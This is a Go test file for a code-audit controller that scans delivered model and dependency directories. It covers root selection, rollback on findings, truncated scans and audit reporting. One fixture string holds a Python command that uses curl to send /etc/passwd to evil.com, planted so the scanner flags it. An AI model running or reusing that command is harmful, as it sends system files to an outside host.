package controller

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"taa/internal/codeaudit"
)

// ruleMatchingPython is a file the baseline engine blocks: CMD_001 is a HIGH rule, so
// a root holding this file fails the audit. benignPython is its opposite. The two
// together are what let a test decide which root a failure comes from without
// depending on the engine's rule details.
const (
	ruleMatchingPython = "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
	benignPython       = "import os\n"
	// lowRiskPython matches EMB_003, which the classifier scores LOW, so an audit
	// containing it still passes under the default policy while the root it sits in
	// does carry a finding.
	lowRiskPython = "print(dataset)\n"
)

func writePythonFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("create %s: %v", dir, err)
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
	return path
}

// bindDepsDir creates DEPS_DIR/<hash> holding one file and binds it, returning the
// directory. The binding is what makes the dependency side "in effect" for a
// combined audit; the directory is what makes it usable as a root.
func bindDepsDir(t *testing.T, state *TAAState, hash, code string) string {
	t.Helper()
	depsDir := filepath.Join(state.Security.GetDepsDir(), hash)
	writePythonFile(t, depsDir, "pkg.py", code)
	state.saveDepsSuccess(hash, nil)
	return depsDir
}

// fixedReportEngine is a StaticEngine that returns a scan report a test chose. It
// exists for the one scan outcome the real engine cannot be asked for on demand --
// a scan that hit the finding cap -- because that is the case the rollback rule
// turns on, and the alternative (planting 200 matching findings on disk) would
// test the cap rather than the rule.
//
// Only ScanDirectoriesWithLines is overridden; every other method is inherited from
// the embedded nil and would panic if called, which is the point: the audit entry
// point under test reaches nothing else.
type fixedReportEngine struct {
	codeaudit.StaticEngine
	report     *codeaudit.Report
	lineCounts map[string]int
}

func (e fixedReportEngine) ScanDirectoriesWithLines([]string) (*codeaudit.Report, map[string]int, error) {
	return e.report, e.lineCounts, nil
}

func (e fixedReportEngine) Name() string { return "fixed-report" }

// combinedAuditCapture is one /v1/taa/reportAudit request as the platform sees it.
// Report is a string because that is what the wire carries: the payload is the
// projection JSON-encoded into a string field of the request, so the tests below
// decode it a second time to read the keys it actually sends.
type combinedAuditCapture struct {
	Code   int     `json:"code"`
	Scope  string  `json:"scope"`
	Msg    *string `json:"msg"`
	Report string  `json:"report"`
}

// captureCombinedAuditReports points state at a platform stub that records every
// /v1/taa/reportAudit request and returns the channel they arrive on.
//
// The channel is buffered past one so that a second report -- the failure the
// "one audit, one report" assertion is about -- lands where a test can see it
// rather than blocking its sender. PlatformIP and DockerID are written under the
// lock because reportAuditScopedAsync reads them under the same lock.
func captureCombinedAuditReports(t *testing.T, state *TAAState) <-chan combinedAuditCapture {
	t.Helper()
	received := make(chan combinedAuditCapture, 4)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != reportAuditEndpoint {
			w.WriteHeader(http.StatusOK)
			return
		}
		var rr combinedAuditCapture
		_ = json.NewDecoder(r.Body).Decode(&rr)
		received <- rr
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(platform.Close)

	state.mu.Lock()
	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
	state.mu.Unlock()
	return received
}

// waitForCombinedAuditReport returns the next audit report or fails the test with the
// reason it never arrived.
func waitForCombinedAuditReport(t *testing.T, received <-chan combinedAuditCapture) combinedAuditCapture {
	t.Helper()
	select {
	case rr := <-received:
		return rr
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for the reportAudit callback")
		return combinedAuditCapture{}
	}
}

// requireNoCombinedAuditReport fails if a report is still pending after the audit
// has returned. The callbacks are asynchronous, so this is a wait rather than a
// read of a counter: the question is whether a report is on its way, not whether one
// has landed yet.
func requireNoCombinedAuditReport(t *testing.T, received <-chan combinedAuditCapture) {
	t.Helper()
	select {
	case rr := <-received:
		t.Fatalf("an audit report was sent when none should be: %+v", rr)
	case <-time.After(300 * time.Millisecond):
	}
}

// requireAuditStateCleared fails unless the audit bookkeeping is back to idle. It is
// asserted after every run because a leaked AuditRunning does not merely misreport
// status: isAuditBusyLocked reads it, so the next model or dependency delivery would
// be refused for the life of the process.
func requireAuditStateCleared(t *testing.T, state *TAAState) {
	t.Helper()
	state.mu.RLock()
	defer state.mu.RUnlock()
	if state.AuditRunning || state.CurrentAuditOp != "idle" || state.ActiveAuditTaskID != "" || state.ActiveAuditRequestID != "" {
		t.Fatalf("audit state not cleared: running=%v op=%q task=%q request=%q",
			state.AuditRunning, state.CurrentAuditOp, state.ActiveAuditTaskID, state.ActiveAuditRequestID)
	}
}

// TestCombinedAuditRootsPerTrigger pins which roots a trigger covers. Root selection
// is where a missing directory would otherwise reach the walk, and the walk fails the
// whole audit on a missing root -- so every case here is a case that would reject a
// legitimate delivery if the rule were dropped.
func TestCombinedAuditRootsPerTrigger(t *testing.T) {
	for _, tc := range []struct {
		name          string
		side          string
		modelImported bool
		boundHash     string // "" = nothing bound
		dropBoundDir  bool
		missingCand   bool
		want          []string // "model", "bound", "candidate"
	}{
		{
			name: "model trigger with a bound dependency set",
			side: codeAuditTriggerModel, modelImported: true, boundHash: "boundset",
			want: []string{"model", "bound"},
		},
		{
			name: "model trigger with no dependency set bound",
			side: codeAuditTriggerModel, modelImported: true,
			want: []string{"model"},
		},
		{
			// The bound directory is named by state but is not on disk. Handing it to
			// the audit would fail the walk and, under fail-closed, reject the model
			// that was just delivered.
			name: "model trigger with a bound directory that is gone",
			side: codeAuditTriggerModel, modelImported: true, boundHash: "boundset", dropBoundDir: true,
			want: []string{"model"},
		},
		{
			name: "deps trigger with the model in effect",
			side: codeAuditTriggerDeps, modelImported: true, boundHash: "boundset",
			want: []string{"model", "candidate"},
		},
		{
			// The "dependencies first, model second" order. The model side must be
			// omitted, not passed in as an empty directory.
			name: "deps trigger with no model imported",
			side: codeAuditTriggerDeps, modelImported: false,
			want: []string{"candidate"},
		},
		{
			// Nothing in effect: the delivered directory is gone, which no successful
			// pipeline run produces. The audit still names it, so the failure lands on
			// the side that owns it instead of on an empty root list.
			name: "deps trigger whose delivered directory is gone",
			side: codeAuditTriggerDeps, modelImported: false, missingCand: true,
			want: []string{"candidate"},
		},
		{
			// The model trigger with the import flag unset and nothing else bound: the
			// delivered model is the only thing left to audit, and dropping it would
			// leave the audit with no subject at all.
			name: "model trigger with the import flag unset",
			side: codeAuditTriggerModel, modelImported: false,
			want: []string{"model"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			state.Security.Engine = codeaudit.DefaultEngine()
			writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)

			if tc.boundHash != "" {
				boundDir := bindDepsDir(t, state, tc.boundHash, benignPython)
				if tc.dropBoundDir {
					if err := os.RemoveAll(boundDir); err != nil {
						t.Fatalf("remove bound dir: %v", err)
					}
				}
			}

			candidate := filepath.Join(state.Security.GetDepsDir(), "candidate")
			if !tc.missingCand {
				writePythonFile(t, candidate, "pkg.py", benignPython)
			}

			if tc.modelImported {
				state.updateImportState(true, true, 1)
			}

			triggerDir := candidate
			if tc.side == codeAuditTriggerModel {
				triggerDir = state.Security.ModelDir
			}

			got := state.combinedAuditRoots(tc.side, triggerDir)

			want := make([]string, 0, len(tc.want))
			for _, token := range tc.want {
				switch token {
				case "model":
					want = append(want, state.Security.ModelDir)
				case "bound":
					want = append(want, filepath.Join(state.Security.GetDepsDir(), tc.boundHash))
				case "candidate":
					want = append(want, candidate)
				}
			}
			if len(got) != len(want) {
				t.Fatalf("roots = %v, want %v", got, want)
			}
			for i := range want {
				if got[i] != want[i] {
					t.Fatalf("roots = %v, want %v (position %d)", got, want, i)
				}
			}
		})
	}
}

// TestCombinedAuditRootsKeepTheModelFirst pins the ordering rule on its own, because
// the ordering is load-bearing rather than cosmetic: AuditTarget.Directory and the
// CPG symbol index both come from roots[0].
//
// Both sides are in effect on purpose. With the dependency root absent the model is
// the only root and lands at position 0 whatever order the selection used, so the
// assertion would hold for a selection that never had to choose -- which is exactly
// what an earlier version of this test did.
func TestCombinedAuditRootsKeepTheModelFirst(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.Engine = codeaudit.DefaultEngine()
	writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	bindDepsDir(t, state, "boundset", benignPython)
	state.updateImportState(true, true, 1)

	// The deps root's path sorts before the model root's in most layouts, so a
	// selection that collected the sides in trail order would be caught here.
	candidate := filepath.Join(state.Security.GetDepsDir(), "candidate")
	writePythonFile(t, candidate, "pkg.py", benignPython)

	got := state.combinedAuditRoots(codeAuditTriggerDeps, candidate)
	if len(got) != 2 {
		t.Fatalf("roots = %v, want the model directory and the delivered dependency directory", got)
	}
	if got[0] != state.Security.ModelDir {
		t.Fatalf("roots = %v, want the model directory first (%s)", got, state.Security.ModelDir)
	}
	if got[1] != candidate {
		t.Fatalf("roots = %v, want the delivered dependency directory second (%s)", got, candidate)
	}
}

// TestCombinedAuditDepsTriggerAuditsTheCandidateNotTheBinding is the mutation-prone
// half of root selection: DepsHash still names the previous set while the audit runs
// (saveDepsSuccess updates it only after the audit passes), so a trigger that reached
// for currentDepsDir() would audit a set that is not the one delivered -- and would
// pass, because the directory in the fixture that is bound is clean and the candidate
// is not.
func TestCombinedAuditDepsTriggerAuditsTheCandidateNotTheBinding(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.Engine = codeaudit.DefaultEngine()
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	state.updateImportState(true, true, 1)

	boundDir := bindDepsDir(t, state, "boundset", benignPython)
	candidate := filepath.Join(state.Security.GetDepsDir(), "candidate")
	writePythonFile(t, candidate, "pkg.py", ruleMatchingPython)
	received := captureCombinedAuditReports(t, state)

	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-c", TaskID: "task-c"}, codeAuditTriggerDeps, candidate)

	if result.Passed {
		t.Fatal("the audit passed while the candidate directory holds a HIGH finding: the binding was audited instead of the candidate")
	}
	if result.TriggerClean {
		t.Fatal("TriggerClean = true for a triggering root holding the finding")
	}
	rr := waitForCombinedAuditReport(t, received)
	if rr.Code != 1 {
		t.Fatalf("code = %d, want 1", rr.Code)
	}
	roots := projectedRoots(t, rr)
	if len(roots) != 2 {
		t.Fatalf("projected roots = %+v, want the model root and the candidate", roots)
	}
	if roots[1].Directory != candidate {
		t.Fatalf("second root = %q, want the candidate %q", roots[1].Directory, candidate)
	}
	for _, r := range roots {
		if r.Directory == boundDir {
			t.Fatalf("the bound directory %q was audited; the candidate was what this delivery installed", boundDir)
		}
	}
}

// projectedRoot is a reportAudit report's per-root entry as the platform receives it.
type projectedRoot struct {
	Directory     string `json:"directory"`
	FilesScanned  int    `json:"files_scanned"`
	FindingsCount int    `json:"findings_count"`
	Passed        bool   `json:"passed"`
}

// projectedRoots decodes the roots array out of a captured audit report and fails the
// test if the projection dropped it. The assertion runs against the wire payload and
// not the AuditReport because the wire payload is the only place the breakdown can
// reach the platform: the report field is a projection that selects a few top-level
// keys, and a breakdown it does not select does not exist for its reader.
func projectedRoots(t *testing.T, rr combinedAuditCapture) []projectedRoot {
	t.Helper()
	if len(rr.Report) == 0 {
		t.Fatal("the audit report is empty")
	}
	var payload map[string]json.RawMessage
	if err := json.Unmarshal([]byte(rr.Report), &payload); err != nil {
		t.Fatalf("report is not a JSON object: %v", err)
	}
	for _, key := range []string{"conclusion", "file_reports", "roots"} {
		if _, ok := payload[key]; !ok {
			t.Fatalf("projected report has no %q key: %s", key, rr.Report)
		}
	}
	var roots []projectedRoot
	if err := json.Unmarshal(payload["roots"], &roots); err != nil {
		t.Fatalf("roots is not an array: %v", err)
	}
	return roots
}

// TestCombinedAuditTriggerCleanTruthTable walks the rollback rule. The middle rows are
// new behaviour -- a failure on the other side no longer clears the delivered side --
// and the truncated row is the one that would regress silently: its visible findings
// are all on the other root, so attribution alone says the trigger is clean while the
// scan in fact never reached part of its input. Reading that as clean is the
// fail-open the rule exists to close, and it is why TriggerClean is not simply
// "no finding under the trigger root".
func TestCombinedAuditTriggerCleanTruthTable(t *testing.T) {
	for _, tc := range []struct {
		name             string
		side             string
		modelCode        string
		depsCode         string // content of the bound dependency directory; "" = nothing bound
		candidateCode    string // content of the directory a deps trigger delivers
		truncatedScan    bool
		wantPassed       bool
		wantTriggerClean bool
		// wantFindingsUnderTrigger is asserted alongside TriggerClean so that the rows
		// where the two disagree cannot be mistaken for each other. It is also what
		// keeps the below-threshold row from passing vacuously.
		wantFindingsUnderTrigger bool
	}{
		{
			name: "clean delivery and clean other side",
			side: codeAuditTriggerModel, modelCode: benignPython, depsCode: benignPython,
			wantPassed: true, wantTriggerClean: true,
		},
		{
			// A below-threshold finding under the triggering root: the audit as a whole
			// passes, so nothing is cleared. Clearing here would roll back a delivery
			// over a finding the policy itself accepts.
			name: "only a below-threshold finding under the triggering root",
			side: codeAuditTriggerModel, modelCode: lowRiskPython, depsCode: benignPython,
			wantPassed: true, wantTriggerClean: true, wantFindingsUnderTrigger: true,
		},
		{
			name: "finding only on the other side, model trigger",
			side: codeAuditTriggerModel, modelCode: benignPython, depsCode: ruleMatchingPython,
			wantPassed: false, wantTriggerClean: true,
		},
		{
			name: "finding only on the other side, deps trigger",
			side: codeAuditTriggerDeps, modelCode: ruleMatchingPython, depsCode: benignPython,
			wantPassed: false, wantTriggerClean: true,
		},
		{
			name: "finding on the triggering root, model trigger",
			side: codeAuditTriggerModel, modelCode: ruleMatchingPython, depsCode: benignPython,
			wantPassed: false, wantTriggerClean: false, wantFindingsUnderTrigger: true,
		},
		{
			// The finding sits in the candidate this delivery installed, not in the
			// bound directory the trigger is not about.
			name: "finding on the triggering root, deps trigger",
			side: codeAuditTriggerDeps, modelCode: benignPython, depsCode: benignPython, candidateCode: ruleMatchingPython,
			wantPassed: false, wantTriggerClean: false, wantFindingsUnderTrigger: true,
		},
		{
			// Attribution says the model is clean: the only visible finding is under
			// the dependency directory. The scan truncated, so it cannot say that.
			name: "truncated scan whose visible findings are all on the other side",
			side: codeAuditTriggerModel, modelCode: benignPython, depsCode: benignPython, truncatedScan: true,
			wantPassed: false, wantTriggerClean: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			state.Security.ScanEnabled = true
			state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
			state.Security.Engine = codeaudit.DefaultEngine()

			modelFile := writePythonFile(t, state.Security.ModelDir, "train.py", tc.modelCode)
			state.updateImportState(true, true, 1)

			var depsDir string
			if tc.depsCode != "" {
				depsDir = bindDepsDir(t, state, "boundset", tc.depsCode)
			}

			if tc.truncatedScan {
				depsFile := filepath.Join(depsDir, "pkg.py")
				state.Security.Engine = fixedReportEngine{
					report: &codeaudit.Report{
						ScannedDir:   state.Security.ModelDir,
						Directories:  []string{state.Security.ModelDir, depsDir},
						FilesCount:   2,
						Passed:       true,
						ScanComplete: true,
						Truncated:    true,
						Findings: []codeaudit.Finding{{
							File: depsFile, Line: 2, RuleID: "CMD_001", Category: "命令执行",
							Severity: codeaudit.SeverityHigh, Description: "命令执行",
						}},
					},
					lineCounts: map[string]int{modelFile: 2, depsFile: 2},
				}
			}

			candidateCode := tc.candidateCode
			if candidateCode == "" {
				candidateCode = benignPython
			}
			triggerDir := filepath.Join(state.Security.GetDepsDir(), "candidate")
			writePythonFile(t, triggerDir, "candidate.py", candidateCode)
			if tc.side == codeAuditTriggerModel {
				triggerDir = state.Security.ModelDir
			}

			received := captureCombinedAuditReports(t, state)
			result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-t", TaskID: "task-t"}, tc.side, triggerDir)
			rr := waitForCombinedAuditReport(t, received)

			if result.Passed != tc.wantPassed {
				t.Fatalf("Passed = %v, want %v", result.Passed, tc.wantPassed)
			}
			if result.TriggerClean != tc.wantTriggerClean {
				t.Fatalf("TriggerClean = %v, want %v (report: provedClean=%v findingsUnderTrigger=%v)",
					result.TriggerClean, tc.wantTriggerClean,
					result.Report.ScanMetadata.ScanProvedClean, codeaudit.ReportHasFindingsUnder(result.Report, triggerDir))
			}
			if !result.Executed {
				t.Fatal("Executed = false for an audit that ran")
			}
			if result.Report == nil {
				t.Fatal("no report on a completed audit")
			}

			// Attribution is asserted directly, because two rows below turn on
			// ReportHasFindingsUnder disagreeing with TriggerClean: a report that
			// carried no findings under the trigger root at all would let the
			// below-threshold row pass for the wrong reason, and would make the
			// truncated row's "all visible findings are elsewhere" claim untested.
			findingsUnderTrigger := codeaudit.ReportHasFindingsUnder(result.Report, triggerDir)
			if findingsUnderTrigger != tc.wantFindingsUnderTrigger {
				t.Fatalf("ReportHasFindingsUnder(trigger root) = %v, want %v", findingsUnderTrigger, tc.wantFindingsUnderTrigger)
			}

			wantCode := 0
			if !tc.wantPassed {
				wantCode = 1
			}
			if rr.Code != wantCode {
				t.Fatalf("code = %d, want %d", rr.Code, wantCode)
			}

			// The truncated arm asserts the two facts the rule turns on, so that a
			// failure here names the mechanism rather than the symptom.
			if tc.truncatedScan {
				if result.Report.ScanMetadata.ScanProvedClean {
					t.Fatal("a truncated scan reported ScanProvedClean = true")
				}
				for _, root := range result.Report.Roots {
					if root.Passed {
						t.Errorf("root %s passed on the evidence of a truncated scan", root.Directory)
					}
				}
			}
		})
	}
}

// TestCombinedAuditReportsOnceWithScopeAndRoots pins the wire contract of a single
// audit: one reportAudit, the scope of the triggering side, and the per-root
// breakdown carried in the report the platform receives.
func TestCombinedAuditReportsOnceWithScopeAndRoots(t *testing.T) {
	for _, tc := range []struct {
		name      string
		side      string
		wantScope string
	}{
		{"model trigger reports under the model scope", codeAuditTriggerModel, ""},
		{"deps trigger reports under the deps scope", codeAuditTriggerDeps, "deps"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			state.Security.ScanEnabled = true
			state.Security.Engine = codeaudit.DefaultEngine()
			state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
			writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
			state.updateImportState(true, true, 1)
			depsDir := bindDepsDir(t, state, "boundset", benignPython)

			triggerDir := depsDir
			if tc.side == codeAuditTriggerModel {
				triggerDir = state.Security.ModelDir
			}

			received := captureCombinedAuditReports(t, state)
			result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-r", TaskID: "task-r"}, tc.side, triggerDir)
			rr := waitForCombinedAuditReport(t, received)

			if rr.Scope != tc.wantScope {
				t.Fatalf("scope = %q, want %q", rr.Scope, tc.wantScope)
			}
			if rr.Code != 0 {
				t.Fatalf("code = %d, want 0 for a clean two-root audit", rr.Code)
			}
			if !result.Passed || !result.TriggerClean {
				t.Fatalf("clean audit reported passed=%v triggerClean=%v", result.Passed, result.TriggerClean)
			}

			roots := projectedRoots(t, rr)
			if len(roots) != 2 {
				t.Fatalf("projected roots = %+v, want two", roots)
			}
			if roots[0].Directory != state.Security.ModelDir {
				t.Fatalf("first root = %q, want the model directory %q", roots[0].Directory, state.Security.ModelDir)
			}
			if roots[1].Directory != depsDir {
				t.Fatalf("second root = %q, want the dependency directory %q", roots[1].Directory, depsDir)
			}
			for _, root := range roots {
				if !root.Passed {
					t.Errorf("root %s passed = false in a clean audit", root.Directory)
				}
			}

			// One audit, one report. The callbacks are asynchronous, so a second one
			// would be in flight rather than counted yet: waiting is the assertion.
			requireNoCombinedAuditReport(t, received)

			// LastAudit carries the combined report, which is what the training report
			// publishes; a dependency-triggered audit is a report about the model code
			// too, so both triggers write it.
			last := state.getLastAudit()
			if last == nil {
				t.Fatal("LastAudit is nil after a completed audit")
			}
			if last.ReportID != result.Report.ReportID {
				t.Fatalf("LastAudit = %s, want the report just produced (%s)", last.ReportID, result.Report.ReportID)
			}
			requireAuditStateCleared(t, state)
		})
	}
}

// TestCombinedAuditScanDisabledShortCircuits pins the one exception to fail-closed:
// with scanning off the audit is skipped whole. Nothing is reported, nothing is
// cleared, and TriggerClean is true -- a caller reading false here would delete a
// delivery no audit had judged.
func TestCombinedAuditScanDisabledShortCircuits(t *testing.T) {
	state, _ := setupTestState(t) // ScanEnabled is false in this fixture
	// The LLM is enabled and fail-closed on a dead endpoint: if the short-circuit did
	// not come first, the readiness probe would turn this into a code=2 rejection.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: true, FailClosed: true, Endpoint: "http://127.0.0.1:1", Model: "qwen2.5-coder:0.5b"}
	writePythonFile(t, state.Security.ModelDir, "train.py", ruleMatchingPython)
	state.updateImportState(true, true, 1)

	candidate := filepath.Join(state.Security.GetDepsDir(), "candidate")
	writePythonFile(t, candidate, "pkg.py", ruleMatchingPython)
	received := captureCombinedAuditReports(t, state)

	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-s", TaskID: "task-s"}, codeAuditTriggerDeps, candidate)

	if result.Executed {
		t.Fatal("Executed = true with scanning disabled")
	}
	if !result.Passed || !result.TriggerClean {
		t.Fatalf("skipped audit reported passed=%v triggerClean=%v, want both true", result.Passed, result.TriggerClean)
	}
	if result.Report != nil {
		t.Fatal("a skipped audit produced a report")
	}
	requireNoCombinedAuditReport(t, received)
	if state.getLastAudit() != nil {
		t.Fatal("a skipped audit overwrote LastAudit")
	}
	requireAuditStateCleared(t, state)
}

// TestCombinedAuditExecutionFailuresClearTheTrigger pins the two ways an audit fails
// to execute. Neither can say which side is at fault, so both leave the delivered
// side implicated -- the fail-closed direction -- and both report code=2.
func TestCombinedAuditExecutionFailuresClearTheTrigger(t *testing.T) {
	for _, tc := range []struct {
		name  string
		llm   codeaudit.LLMConfig
		built func(t *testing.T, state *TAAState)
	}{
		{
			name: "LLM unavailable under fail-closed",
			llm:  codeaudit.LLMConfig{Enabled: true, FailClosed: true, Endpoint: "http://127.0.0.1:1", Model: "qwen2.5-coder:0.5b"},
		},
		{
			name: "no engine configured",
			llm:  codeaudit.LLMConfig{Enabled: false},
			built: func(t *testing.T, state *TAAState) {
				state.Security.Engine = nil
			},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			state, _ := setupTestState(t)
			state.Security.ScanEnabled = true
			state.Security.LLM = tc.llm
			writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
			state.updateImportState(true, true, 1)
			if tc.built != nil {
				tc.built(t, state)
			}

			candidate := filepath.Join(state.Security.GetDepsDir(), "candidate")
			writePythonFile(t, candidate, "pkg.py", benignPython)
			received := captureCombinedAuditReports(t, state)

			result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-e", TaskID: "task-e"}, codeAuditTriggerDeps, candidate)
			rr := waitForCombinedAuditReport(t, received)

			if !result.Executed {
				t.Fatal("Executed = false for an audit that was attempted")
			}
			if result.TriggerClean {
				t.Fatal("TriggerClean = true for an audit that never produced a verdict")
			}
			if result.Passed {
				t.Fatal("Passed = true for an audit that never produced a verdict")
			}
			if result.Report != nil {
				t.Fatal("a report was produced for an audit that failed to execute")
			}
			if rr.Code != 2 {
				t.Fatalf("code = %d, want 2", rr.Code)
			}
			if rr.Scope != "deps" {
				t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
			}
			if len(rr.Report) != 0 {
				t.Fatalf("report = %s, want none for an audit that did not execute", rr.Report)
			}
			// A failed execution is not a verdict, and the training report must not
			// publish one as if it were.
			if state.getLastAudit() != nil {
				t.Fatal("a failed execution overwrote LastAudit with a verdict it does not have")
			}
			requireAuditStateCleared(t, state)
		})
	}
}

// TestCombinedAuditReportsTheEngineFailureReason keeps the code=2 branch legible to an
// operator: the platform is told what failed, not merely that something did.
func TestCombinedAuditReportsTheEngineFailureReason(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = nil
	writePythonFile(t, state.Security.ModelDir, "train.py", benignPython)
	state.updateImportState(true, true, 1)
	received := captureCombinedAuditReports(t, state)

	state.runCombinedAudit(codeAuditRequest{RequestID: "req-m", TaskID: "task-m"}, codeAuditTriggerModel, state.Security.ModelDir)
	rr := waitForCombinedAuditReport(t, received)

	if rr.Msg == nil || !strings.Contains(*rr.Msg, "代码审计失败") {
		t.Fatalf("msg = %v, want it to name the audit failure", rr.Msg)
	}
}
